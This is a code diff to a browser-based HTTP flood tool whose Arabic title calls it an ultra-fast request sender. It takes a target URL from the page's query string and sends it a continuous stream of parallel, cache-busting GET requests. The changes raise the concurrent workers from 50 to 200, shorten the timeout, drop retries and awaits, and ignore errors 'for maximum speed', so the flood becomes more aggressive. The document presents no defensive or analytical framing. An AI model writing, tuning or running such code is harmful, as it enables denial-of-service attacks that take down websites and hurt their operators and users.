@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ar">
 <head>
@@ -6,10 +7,9 @@
     <title>أداة إرسال طلبات فائقة السرعة</title>
     <script>
         const config = {
-            parallelRequests: 50,      // عدد الطلبات المتوازية
-            requestTimeout: 2000,     // وقت انتهاء الطلب
-            cacheBusting: true,       // تجنب التخزين المؤقت
-            maxRetries: 1             // عدد إعادة المحاولات لكل طلب فاشل
+            parallelRequests: 200,    // زيادة عدد العمال إلى 200
+            requestTimeout: 1000,    // تقليل وقت الانتظار إلى ثانية واحدة
+            cacheBusting: true       // تجنب التخزين المؤقت
         };
 
         let stats = {
@@ -29,45 +29,34 @@
         }
 
         function getRandomHeaders() {
-            const browsers = [
-                `Chrome/${Math.floor(Math.random() * 20) + 80}`,
-                `Firefox/${Math.floor(Math.random() * 20) + 70}`,
-                `Safari/${Math.floor(Math.random() * 10) + 10}`
-            ];
             return {
-                'User-Agent': `Mozilla/5.0 (${Math.random() > 0.5 ? 'Windows NT 10.0' : 'Macintosh'}) AppleWebKit/537.36 (KHTML, like Gecko) ${browsers[Math.floor(Math.random() * browsers.length)]}`,
-                'Accept': '*/*',
                 'Cache-Control': 'no-cache'
             };
         }
 
-        async function fireRequest(url, retries = config.maxRetries) {
+        function fireRequest(url) {
             if (!isRunning) return;
 
             const controller = new AbortController();
             const timeout = setTimeout(() => controller.abort(), config.requestTimeout);
 
-            try {
-                const fullUrl = url + (config.cacheBusting ? `&_=${Date.now()}${Math.random().toString(36).slice(2)}` : '');
-                const response = await fetch(fullUrl, {
-                    method: 'GET',
-                    headers: getRandomHeaders(),
-                    mode: 'no-cors',
-                    cache: 'no-store',
-                    signal: controller.signal
-                });
+            const fullUrl = url + (config.cacheBusting ? `&_=${Math.random().toString(36).slice(2)}` : '');
+            fetch(fullUrl, {
+                method: 'GET',
+                headers: getRandomHeaders(),
+                mode: 'no-cors',
+                cache: 'no-store',
+                signal: controller.signal
+            })
+            .then(() => {
                 stats.total++;
                 stats.rps++;
-            } catch (e) {
-                if (retries > 0 && e.name !== 'AbortError') {
-                    return fireRequest(url, retries - 1); // إعادة المحاولة
-                }
-            } finally {
-                clearTimeout(timeout);
-            }
+            })
+            .catch(() => {}) // تجاهل الأخطاء للسرعة
+            .finally(() => clearTimeout(timeout));
         }
 
-        async function startFlood(targetUrl, duration) {
+        function startFlood(targetUrl, duration) {
             if (!targetUrl) {
                 document.body.textContent = 'خطأ: يرجى إضافة ?url=الرابط_الهدف';
                 return;
@@ -81,14 +70,17 @@
                 stats.rps = 0;
             }, 1000);
 
-            const workerPool = Array(config.parallelRequests).fill().map(async () => {
-                while (isRunning && Date.now() < stats.startTime + (duration * 1000)) {
-                    await fireRequest(targetUrl);
-                }
+            // إطلاق الطلبات بشكل مستمر
+            const workers = Array(config.parallelRequests).fill().map(() => {
+                return async () => {
+                    while (isRunning && Date.now() < stats.startTime + (duration * 1000)) {
+                        fireRequest(targetUrl); // بدون await للسرعة القصوى
+                    }
+                };
             });
 
-            await Promise.all(workerPool);
-            stopFlood();
+            workers.forEach(worker => worker());
+            setTimeout(stopFlood, duration * 1000);
         }
 
         function stopFlood() {
